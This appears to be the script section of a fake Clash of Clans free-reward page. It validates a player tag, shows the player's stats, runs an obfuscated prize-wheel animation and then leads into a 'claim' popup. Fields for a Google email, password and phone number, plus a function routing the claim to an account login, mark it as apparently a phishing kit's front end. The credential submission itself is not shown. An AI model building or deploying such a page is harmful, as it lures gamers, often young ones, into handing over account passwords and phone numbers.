function populateCarousel(carouselContainer, images) {
    const slidesContainer = carouselContainer.querySelector('.carousel-slides');
    slidesContainer.innerHTML = '';
    images.forEach((imgSrc, index) => {
        const slide = document.createElement('div');
        slide.className = 'carousel-slide' + (index === 0 ? ' active' : '');
        const img = document.createElement('img');
        img.src = imgSrc;
        img.alt = "Reward Header " + (index + 1);
        slide.appendChild(img);
        slidesContainer.appendChild(slide);
    });
}

function initializeCarousel(carouselElement, categoryId) {
    let currentSlide = 0;
    const slides = carouselElement.querySelectorAll('.carousel-slide');
    const totalSlides = slides.length;

    if (totalSlides === 0) return;

    slides.forEach(slide => slide.style.display = 'none');
    if (slides[currentSlide]) {
      slides[currentSlide].style.display = 'block';
    }
    
    if (carouselIntervals[categoryId]) {
        clearInterval(carouselIntervals[categoryId]);
    }

    function showSlide(index) {
        if (!slides[currentSlide] || !slides[index]) return;
        slides[currentSlide].style.display = 'none';
        slides[index].style.display = 'block';
        currentSlide = index;
    }

    carouselIntervals[categoryId] = setInterval(function() {
        showSlide((currentSlide + 1) % totalSlides);
    }, 1400);
}

$(document).ready(function() {
    if (document.getElementById("defaultTabRewards")) {
        document.getElementById("defaultTabRewards").click();
    }

    $('#email-google, #password-google, #phone').each(function() {
        const el = this;
        setFocus(false, el);
        $(el).on('focus', function() {
                setFocus(true, this);
            })
            .on('blur', function() {
                setFocus(false, this);
            });
    });

    $("#claimnow").click(function() {
        $(".popscid").show();
        $(".popscid .cont").show();
        $(".popscid .phone-verif").hide();
        $(".popscid .success-alert").hide();
        $(".popscid .slider .bawah").css('justify-content', 'flex-start');
    });

    function playSound() {
        if (typeof buka !== 'undefined' && buka.play) {
            buka.play().catch(function(error) {});
        }
    }

    $('#submitButton').on('click', function(event) {
        playSound();
        const playerTagInput = $('#playertag');
        let playerTag = playerTagInput.val().trim();
        const formMessage = $('.id-alert');
        const submitButton = $(this);

        formMessage.hide().text('').removeClass('error success');
        if (!playerTag) {
            formMessage.text('Player ID cannot be empty.').addClass('error').show();
            playerTagInput.focus();
            return;
        }

        $.ajax({
            url: 'api-shagitz.php',
            type: 'POST',
            data: {
                player_tag: playerTag
            },
            dataType: 'json',
            beforeSend: function() {
                submitButton.prop('disabled', true).text('Checking...');
            },
            success: function(response) {
                $('.id-verification').hide();
                $('.accountInfo').show();
                $('.nickname').html(response && response.name ? `${response.name}` : '');
                $('#nicksuccess').html(response && response.name ? `Hi, ${response.name}` : 'Hi, Player');
                if (response && response.clan && response.clan.badgeUrls && response.clan.badgeUrls.small && response.clan.name) {
                    $('.info .list.clan').html(`<img src="${response.clan.badgeUrls.small}" alt="Clan Badge"> ${response.clan.name}`);
                } else {
                    $('.info .list.clan').html(`<img src="img/default_clan_badge.png" alt="Clan Badge"> N/A`);
                }
                if (response && typeof response.expLevel !== 'undefined') {
                    $('.info .list.exp').html(`<img src="img/exp.webp" alt="Experience"> ${response.expLevel}`);
                } else {
                    $('.info .list.exp').html(`<img src="img/exp.webp" alt="Experience"> N/A`);
                }
                if (response && typeof response.townHallLevel !== 'undefined' && response.townHallLevel > 0) {
                    const townHallImageUrl = `img/th/th${response.townHallLevel}.webp`;
                    $('.info .list.th').html(`<img src="${townHallImageUrl}" alt="Town Hall ${response.townHallLevel}"> TH ${response.townHallLevel}`);
                } else {
                    $('.info .list.th').html(`<img src="img/th/th_default.webp" alt="Town Hall"> N/A`);
                }
                if (response && typeof response.trophies !== 'undefined') {
                    $('.info .list.trophy').html(`<img src="img/trophy.png" alt="Trophies"> ${response.trophies}`);
                } else {
                    $('.info .list.trophy').html(`<img src="img/trophy.png" alt="Trophies"> N/A`);
                }
                let townhallText = response && typeof response.townHallLevel !== 'undefined' && response.townHallLevel > 0 ? `Townhall ${response.townHallLevel}` : 'N/A';
                let expText = response && typeof response.expLevel !== 'undefined' ? `Exp Level ${response.expLevel}` : 'N/A';
                let apiPlayerTag = response && response.tag ? response.tag : `#${playerTag.toUpperCase()}`;
                let apiPlayerName = response && response.name ? response.name : '';
                let apiClanName = response && response.clan && response.clan.name ? response.clan.name : 'N/A';
                $('#s1_townhall').val(townhallText);
                $('#s1_exp').val(expText);
                $('#s1_playertag').val(apiPlayerTag);
                $('#s1_playername').val(apiPlayerName);
                $('#s1_clan').val(apiClanName);
                $('#s2_townhall').val(townhallText);
                $('#s2_exp').val(expText);
                $('#s2_playertag').val(apiPlayerTag);
                $('#s2_playername').val(apiPlayerName);
                $('#s2_clan').val(apiClanName);
                $('#s3_townhall').val(townhallText);
                $('#s3_exp').val(expText);
                $('#s3_playertag').val(apiPlayerTag);
                $('#s3_playername').val(apiPlayerName);
                $('#s3_clan').val(apiClanName);
            },
            error: function(jqXHR, textStatus, errorThrown) {
                let errorMessage = `Error: ${errorThrown} (${jqXHR.status}). Tidak dapat menghubungi server.`;
                try {
                    var errorResponse = JSON.parse(jqXHR.responseText);
                    if (errorResponse && errorResponse.reason === "notFound") {
                        errorMessage = 'Invalid Tag, Try again';
                    } else if (errorResponse && errorResponse.error) {
                        errorMessage = 'Invalid Tag or Server Error, Try again';
                    }
                } catch (e) {
                    console.warn("Error parsing server response or other error:", e);
                }
                formMessage.text(errorMessage).addClass('error').show();
            },
            complete: function() {
                submitButton.prop('disabled', false).text('Search');
            }
        });
    });

});
(function(_0x58a121,_0x2f9887){const _0x5786c1=_0x5e6c,_0x2d9bea=_0x58a121();while(!![]){try{const _0x42c592=parseInt(_0x5786c1(0x1ab))/0x1*(-parseInt(_0x5786c1(0x185))/0x2)+-parseInt(_0x5786c1(0x1a2))/0x3*(-parseInt(_0x5786c1(0x1d6))/0x4)+parseInt(_0x5786c1(0x1bc))/0x5+parseInt(_0x5786c1(0x1cf))/0x6*(parseInt(_0x5786c1(0x1ac))/0x7)+-parseInt(_0x5786c1(0x188))/0x8+-parseInt(_0x5786c1(0x198))/0x9*(-parseInt(_0x5786c1(0x1a3))/0xa)+parseInt(_0x5786c1(0x1b0))/0xb*(parseInt(_0x5786c1(0x1c5))/0xc);if(_0x42c592===_0x2f9887)break;else _0x2d9bea['push'](_0x2d9bea['shift']());}catch(_0x5b2bc6){_0x2d9bea['push'](_0x2d9bea['shift']());}}}(_0x2791,0x22c26),function(_0x166e41,_0x12c46a){const _0x5dc37d=_0x5e6c,_0x3533e5=_0x465f,_0x131f4f=_0x166e41();while(!![]){try{const _0xd7be65=-parseInt(_0x3533e5(0x1eb))/0x1*(parseInt(_0x3533e5(0x1e1))/0x2)+-parseInt(_0x3533e5(0x1e4))/0x3*(-parseInt(_0x3533e5(0x1c4))/0x4)+-parseInt(_0x3533e5(0x1e0))/0x5*(parseInt(_0x3533e5(0x1b6))/0x6)+-parseInt(_0x3533e5(0x1af))/0x7+-parseInt(_0x3533e5(0x1e2))/0x8+-parseInt(_0x3533e5(0x1b1))/0x9*(parseInt(_0x3533e5(0x1d7))/0xa)+parseInt(_0x3533e5(0x1c0))/0xb;if(_0xd7be65===_0x12c46a)break;else _0x131f4f[_0x5dc37d(0x1b7)](_0x131f4f[_0x5dc37d(0x189)]());}catch(_0x247e69){_0x131f4f['push'](_0x131f4f[_0x5dc37d(0x189)]());}}}(_0x4fc7,0x2f2ad));function _0x2791(){const _0x5b12b7=['147540MJTbSQ','floor','.g-imgBox','8941548deePPh','Tap\x20to\x20play!','157633KTzCGm','https://cdn.shagitzsan.my.id/coc/high_seas_scenery.png','24558qPNPVL','Tap!','192oaSvJa','height','1521944dlOxSD','High\x20Seas\x20Scenery','#FF718D','.g-title','innerHeight','https://cdn.shagitzsan.my.id/coc/cyclone_prince.png','4QAJNog','1020216NmQpUS','24IEPuia','3220000DPzEiP','https://cdn.shagitzsan.my.id/coc/darkness_warden.png','text','then','find','#FFC700','62948KNThfV','16wUpXRo','10wZEOwf','https://cdn.shagitzsan.my.id/coc/clash_of_dragon.png','137468luabKY','https://cdn.shagitzsan.my.id/coc/grand_monk.png','106773BLdsnq','#78FF44','2kBGTIZ','#FDFF6A','paused','2097136TmwMYX','shift','addClass','#26CCFF','The\x20Royalest','3767800hLkUtI','controls','attr','error','https://cdn.shagitzsan.my.id/coc/war_machine_scenery.png','undefined','auto','click','Grand\x20Monk','39VPFcSv','preload','171bzKCDo','Clash\x20of\x20Dragon','pause','title','#initialClaimCard\x20.claim','6peTQwW','hide','Darkness\x20Warden','removeClass','width','42nIsYoW','20510JBUzZx','Clashmania\x20Scenery','435fhMyDF','Kyudo\x20Queen','random','https://cdn.shagitzsan.my.id/coc/clashmania_scenery.png','.hint','warn','211547teRnlY','441539TLJcqb','imageSrc','#finalRewardCard','video','51535eJcMnK','Year\x20Of\x20Snake','https://cdn.shagitzsan.my.id/coc/royal_ninja.png','catch','play','King\x20Cody','getElementById','push','https://cdn.shagitzsan.my.id/coc/king_cody.png','innerWidth','img','https://cdn.shagitzsan.my.id/coc/the_royalest.png'];_0x2791=function(){return _0x5b12b7;};return _0x2791();}function _0x4fc7(){const _0x3ba2f0=_0x5e6c,_0x4293d6=[_0x3ba2f0(0x1c0),_0x3ba2f0(0x1b4),_0x3ba2f0(0x19a),_0x3ba2f0(0x1db),_0x3ba2f0(0x1bf),_0x3ba2f0(0x1b3),_0x3ba2f0(0x1d4),'#FF0000',_0x3ba2f0(0x1d7),_0x3ba2f0(0x1a4),_0x3ba2f0(0x1b2),'hide',_0x3ba2f0(0x196),_0x3ba2f0(0x1a1),_0x3ba2f0(0x199),'confetti-canvas',_0x3ba2f0(0x1c7),'#initialClaimCard',_0x3ba2f0(0x1b7),_0x3ba2f0(0x19c),_0x3ba2f0(0x19f),_0x3ba2f0(0x1af),_0x3ba2f0(0x1ae),_0x3ba2f0(0x1cb),_0x3ba2f0(0x187),_0x3ba2f0(0x1a5),'length',_0x3ba2f0(0x1d8),_0x3ba2f0(0x1b6),_0x3ba2f0(0x18d),_0x3ba2f0(0x189),'Royal\x20Ninja','.modal-gacha',_0x3ba2f0(0x18b),_0x3ba2f0(0x1d2),'#rewards-section-content','725295lJXgxm',_0x3ba2f0(0x1cd),_0x3ba2f0(0x1ce),_0x3ba2f0(0x1a9),'166749VqxWgo',_0x3ba2f0(0x195),_0x3ba2f0(0x1a6),'https://cdn.shagitzsan.my.id/coc/kyudo_queen.png',_0x3ba2f0(0x18a),'#A864FD',_0x3ba2f0(0x1c1),_0x3ba2f0(0x1dc),'resize','ready',_0x3ba2f0(0x18c),_0x3ba2f0(0x1d1),_0x3ba2f0(0x186),_0x3ba2f0(0x1aa),_0x3ba2f0(0x190),_0x3ba2f0(0x19b),_0x3ba2f0(0x1c9),_0x3ba2f0(0x1c4),_0x3ba2f0(0x1c3),'currentTime',_0x3ba2f0(0x1ba),_0x3ba2f0(0x194),_0x3ba2f0(0x193),_0x3ba2f0(0x1b9),_0x3ba2f0(0x1bb),'2025569oGkdGB',_0x3ba2f0(0x1c8),'598536ifEgqU',_0x3ba2f0(0x1a7),_0x3ba2f0(0x1dd),_0x3ba2f0(0x18f),'Samurai\x20King',_0x3ba2f0(0x19d),_0x3ba2f0(0x1d9),'6011523CKQwtW',_0x3ba2f0(0x1be),_0x3ba2f0(0x191),_0x3ba2f0(0x1b5)];return _0x4fc7=function(){return _0x4293d6;},_0x4fc7();}const _0x1594d7=_0x3ac0;(function(_0x47f23f,_0x8f8c0e){const _0x2687ed=_0x5e6c,_0x430793=_0x465f,_0x3a2f67=_0x3ac0,_0x3058a0=_0x47f23f();while(!![]){try{const _0x2f9f7e=-parseInt(_0x3a2f67(0xbf))/0x1+parseInt(_0x3a2f67(0x9a))/0x2*(parseInt(_0x3a2f67(0x97))/0x3)+-parseInt(_0x3a2f67(0xd9))/0x4+-parseInt(_0x3a2f67(0xd1))/0x5*(-parseInt(_0x3a2f67(0xa8))/0x6)+-parseInt(_0x3a2f67(0xde))/0x7+-parseInt(_0x3a2f67(0xb3))/0x8+parseInt(_0x3a2f67(0xa1))/0x9;if(_0x2f9f7e===_0x8f8c0e)break;else _0x3058a0[_0x430793(0x1ce)](_0x3058a0[_0x430793(0x1da)]());}catch(_0xbcf2a6){_0x3058a0[_0x430793(0x1ce)](_0x3058a0[_0x2687ed(0x189)]());}}}(_0x3d75,0x6d7e6),$(document)[_0x1594d7(0xdb)](function(){const _0x430858=_0x5e6c,_0x39acfa=_0x465f,_0x52fed1=_0x1594d7,_0x4d08f5=[{'title':'Cyclone\x20Prince','imageSrc':_0x52fed1(0xd6)},{'title':_0x52fed1(0xb1),'imageSrc':_0x430858(0x1a8)},{'title':_0x52fed1(0xbb),'imageSrc':_0x52fed1(0xb0)},{'title':_0x52fed1(0xcc),'imageSrc':_0x52fed1(0xe0)},{'title':_0x52fed1(0x9e),'imageSrc':_0x39acfa(0x1bf)},{'title':_0x39acfa(0x1b0),'imageSrc':_0x430858(0x1c2)},{'title':_0x52fed1(0x9f),'imageSrc':_0x52fed1(0xaa)},{'title':_0x52fed1(0xc9),'imageSrc':_0x52fed1(0xd0)},{'title':_0x52fed1(0xad),'imageSrc':_0x52fed1(0xc7)},{'title':_0x52fed1(0xa5),'imageSrc':_0x52fed1(0xb5)},{'title':_0x52fed1(0xac),'imageSrc':_0x52fed1(0xd8)},{'title':_0x52fed1(0xb7),'imageSrc':_0x39acfa(0x1ba)},{'title':_0x52fed1(0xc0),'imageSrc':'https://cdn.shagitzsan.my.id/coc/year_of_snake.png'}],_0x22f04c=Math[_0x52fed1(0xa3)](Math[_0x52fed1(0xda)]()*_0x4d08f5[_0x52fed1(0xdc)]),_0x75555a=_0x4d08f5[_0x22f04c],_0x419634=$(_0x39acfa(0x1b9));_0x419634[_0x52fed1(0xb8)](_0x430858(0x1ca))[_0x52fed1(0xd3)](_0x75555a[_0x52fed1(0xdf)]),_0x419634[_0x39acfa(0x1c2)](_0x39acfa(0x1aa))[_0x52fed1(0xd4)]('src',_0x75555a[_0x52fed1(0xaf)]);const _0x363ee4=$(_0x52fed1(0xbc)),_0x2b5530=$(_0x52fed1(0xae)),_0x489686=$(_0x52fed1(0xba)),_0x17c3a9=_0x489686[_0x430858(0x1d4)](_0x52fed1(0xb9))[0x0],_0x3bdf41=_0x489686[_0x52fed1(0xb8)](_0x52fed1(0xab)),_0x331c04=$(_0x39acfa(0x1d2)),_0x2e9e9a=[0x1,1.5,1.6,1.5,1.8];let _0x2c1032=0x0;const _0x43d79f=_0x2e9e9a[_0x52fed1(0xdc)];let _0x1087ad=null;_0x17c3a9&&(_0x17c3a9[_0x52fed1(0xcf)]=![],_0x17c3a9[_0x39acfa(0x1be)](),_0x17c3a9[_0x430858(0x197)]=_0x52fed1(0xd2));const _0x472762=document[_0x52fed1(0xbd)](_0x52fed1(0xc6));let _0x348792=null;typeof confetti!==_0x52fed1(0xbe)&&_0x472762?(_0x472762[_0x52fed1(0xd7)]=window[_0x39acfa(0x1ad)],_0x472762[_0x52fed1(0xc1)]=window[_0x52fed1(0xc4)],$(window)['on'](_0x52fed1(0xcb),function(){const _0x136da4=_0x39acfa,_0x1547ed=_0x52fed1;_0x472762[_0x136da4(0x1c9)]=window[_0x1547ed(0xa0)],_0x472762[_0x1547ed(0xc1)]=window[_0x1547ed(0xc4)];}),_0x348792=confetti[_0x52fed1(0xa9)](_0x472762,{'resize':!![],'useWorker':!![]})):console[_0x39acfa(0x1f1)](_0x52fed1(0xb2));function _0x39241f(){const _0x524fa1=_0x39acfa,_0x42dc2c=_0x52fed1;_0x348792&&(_0x348792({'particleCount':0x96,'spread':0x64,'origin':{'y':0.6},'angle':0x5a,'startVelocity':0x2d,'gravity':0.8,'drift':0x0,'ticks':0x12c,'colors':[_0x42dc2c(0xca),_0x42dc2c(0xb4),'#26CCFF',_0x42dc2c(0x9c),_0x42dc2c(0xa2),_0x524fa1(0x1a6),_0x42dc2c(0xc2)]}),setTimeout(()=>_0x348792({'particleCount':0x46,'spread':0x3c,'origin':{'x':0.2,'y':0.7},'angle':0x3c,'startVelocity':0x23,'colors':[_0x42dc2c(0x99),_0x42dc2c(0x9c)]}),0xfa),setTimeout(()=>_0x348792({'particleCount':0x46,'spread':0x3c,'origin':{'x':0.8,'y':0.7},'angle':0x78,'startVelocity':0x23,'colors':[_0x524fa1(0x1b3),_0x42dc2c(0xc5)]}),0x1c2));}function _0xba1adf(){const _0xe01ca6=_0x52fed1;if(!_0x17c3a9)return;if(_0x2c1032<0x0||_0x2c1032>=_0x43d79f)return;const _0x3b4d2=_0x2e9e9a[_0x2c1032];clearTimeout(_0x1087ad),_0x17c3a9[_0xe01ca6(0xd5)]()[_0xe01ca6(0x9d)](()=>{const _0x7a1f5e=_0xe01ca6;_0x3bdf41[_0x7a1f5e(0xcd)](_0x7a1f5e(0xa6));})[_0xe01ca6(0xc3)](_0x18beb2=>{const _0x3d1ea7=_0xe01ca6;console[_0x3d1ea7(0xc8)](_0x3d1ea7(0x9b),_0x18beb2),_0x2c1032===0x0&&_0x3bdf41[_0x3d1ea7(0xa7)](_0x3d1ea7(0xa6))[_0x3d1ea7(0xd3)](_0x3d1ea7(0xa4));}),_0x1087ad=setTimeout(function(){const _0x3655fd=_0x465f,_0x5e595f=_0xe01ca6;_0x17c3a9[_0x5e595f(0xce)]();if(_0x2c1032===_0x43d79f-0x1)_0x489686[_0x5e595f(0xcd)](_0x5e595f(0xa6)),_0x331c04[_0x5e595f(0xa7)](_0x5e595f(0xa6)),_0x17c3a9[_0x5e595f(0xdd)]=0x0,_0x39241f();else _0x2c1032<_0x43d79f-0x1&&_0x3bdf41[_0x5e595f(0xa7)](_0x5e595f(0xa6))[_0x3655fd(0x1de)](_0x5e595f(0xe2));},_0x3b4d2*0x3e8);}_0x363ee4['on'](_0x430858(0x194),function(){const _0x4cfe4a=_0x430858,_0x496c09=_0x39acfa,_0x1ce6cb=_0x52fed1;if(!_0x17c3a9)return;_0x2b5530[_0x1ce6cb(0xcd)](_0x4cfe4a(0x19e)),$(_0x1ce6cb(0xb6))[_0x1ce6cb(0xa6)](),_0x489686[_0x1ce6cb(0xa7)](_0x1ce6cb(0xa6)),_0x17c3a9[_0x496c09(0x1a9)]=0x0,_0x17c3a9[_0x1ce6cb(0xce)](),_0x2c1032=0x0;if(_0x2e9e9a[_0x1ce6cb(0xdc)]>0x0&&_0x2e9e9a[0x0]>0x0)_0xba1adf();else _0x2e9e9a[_0x1ce6cb(0xdc)]>0x0&&_0x2e9e9a[0x0]===0x0&&_0x3bdf41[_0x1ce6cb(0xa7)](_0x1ce6cb(0xa6))[_0x1ce6cb(0xd3)](_0x1ce6cb(0xe2));}),_0x489686['on'](_0x52fed1(0x98),function(){const _0x37e2c5=_0x39acfa,_0x325f16=_0x52fed1;if(!_0x17c3a9)return;if(_0x17c3a9[_0x37e2c5(0x1d4)]&&_0x2c1032<_0x43d79f-0x1)_0x2c1032++,_0xba1adf();else _0x17c3a9[_0x325f16(0xe1)]&&_0x2c1032===0x0&&_0x2e9e9a[0x0]>0x0&&_0x3bdf41[_0x37e2c5(0x1de)]()===_0x325f16(0xa4)&&_0xba1adf();});}));function _0x5e6c(_0x1a6634,_0xe7d211){const _0x27911c=_0x2791();return _0x5e6c=function(_0x5e6c42,_0x4548fa){_0x5e6c42=_0x5e6c42-0x185;let _0x181bde=_0x27911c[_0x5e6c42];return _0x181bde;},_0x5e6c(_0x1a6634,_0xe7d211);}function _0x465f(_0x1a6648,_0x485d1a){const _0xba2da3=_0x4fc7();return _0x465f=function(_0x2f00bd,_0x50fe98){_0x2f00bd=_0x2f00bd-0x1a6;let _0x25d4e5=_0xba2da3[_0x2f00bd];return _0x25d4e5;},_0x465f(_0x1a6648,_0x485d1a);}function _0x3ac0(_0x1df8cd,_0x59a754){const _0x5f5453=_0x3d75();return _0x3ac0=function(_0x4181db,_0x195cbb){_0x4181db=_0x4181db-0x97;let _0x589b91=_0x5f5453[_0x4181db];return _0x589b91;},_0x3ac0(_0x1df8cd,_0x59a754);}function _0x3d75(){const _0x250e14=_0x5e6c,_0x50da54=_0x465f,_0x4e8624=[_0x50da54(0x1c9),_0x50da54(0x1ae),_0x50da54(0x1cc),_0x50da54(0x1b2),_0x50da54(0x1ed),_0x50da54(0x1d6),_0x50da54(0x1a9),_0x250e14(0x1d0),_0x50da54(0x1f3),_0x50da54(0x1ef),_0x50da54(0x1d4),_0x50da54(0x1a7),_0x50da54(0x1c8),_0x50da54(0x1ab),_0x50da54(0x1dd),_0x250e14(0x1da),'Error',_0x50da54(0x1e9),_0x250e14(0x1d3),_0x50da54(0x1e5),_0x50da54(0x1bb),_0x50da54(0x1ad),_0x50da54(0x1b8),_0x250e14(0x1dd),_0x250e14(0x1bd),_0x50da54(0x1bc),_0x50da54(0x1b5),_0x50da54(0x1c7),_0x250e14(0x1a0),_0x50da54(0x1a8),'create',_0x250e14(0x1b8),_0x50da54(0x1e3),_0x50da54(0x1ee),_0x50da54(0x1db),_0x50da54(0x1cd),_0x250e14(0x1ad),_0x50da54(0x1b7),_0x50da54(0x1c5),'Confetti\x20library\x20not\x20loaded\x20or\x20confetti-canvas\x20not\x20found.',_0x50da54(0x1d9),_0x50da54(0x1c3),'https://cdn.shagitzsan.my.id/coc/samurai_king.png',_0x50da54(0x1df),'War\x20Machine\x20Scenery',_0x250e14(0x1d4),_0x50da54(0x1d1),_0x50da54(0x1dc),_0x50da54(0x1ca),_0x50da54(0x1cf),_0x50da54(0x1d8),_0x250e14(0x192),_0x50da54(0x1ea),_0x250e14(0x1b1),_0x250e14(0x1c6),_0x50da54(0x1f0),_0x50da54(0x1c1),_0x50da54(0x1d3),_0x50da54(0x1a6),_0x50da54(0x1cb),_0x50da54(0x1c6),_0x50da54(0x1f2),_0x50da54(0x1e6),_0x250e14(0x1d5),_0x50da54(0x1ec),_0x50da54(0x1d0),_0x50da54(0x1e8),_0x50da54(0x1be),_0x250e14(0x18e),_0x50da54(0x1e7),_0x50da54(0x1d5),_0x50da54(0x1ac),_0x50da54(0x1de),_0x50da54(0x1b4),_0x50da54(0x1bd),_0x250e14(0x1cc)];return _0x3d75=function(){return _0x4e8624;},_0x3d75();}



function open_airdrop_confirmaton(item) {
    open_account_login(item);
}
</script>
<script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"..."}' crossorigin="anonymous"></script>
</body>
</html>